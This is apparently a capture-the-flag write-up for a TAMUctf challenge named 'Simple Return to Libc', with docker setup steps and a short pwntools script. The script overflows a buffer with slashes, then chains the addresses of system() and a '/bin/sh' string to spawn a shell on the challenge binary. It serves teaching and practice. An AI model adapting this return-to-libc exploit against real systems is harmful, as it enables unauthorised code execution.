# Simple Return to Libc

## Challenge
`nc pwn.tamuctf.com 4324`

## Setup

Build the docker container `docker build -t pwn4 .` and run it `docker run pwn4`

## Solution
Find the address of `system()` and `/bin/sh`. Both are static since PIE is not enabled. Payload must have a `/` in it in order to work correctly.  
Below is an example solution script:  
```python
from pwn import *


#p = process('./pwn4')
p = remote('172.17.0.2', 4324)

system = 0x80483f0
binsh = 0x804a034

payload = '/'*37
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(binsh)

f = open('out', 'wb')
f.write(payload +'\n')
f.close()

p.send(payload + '\n')
p.interactive()
```
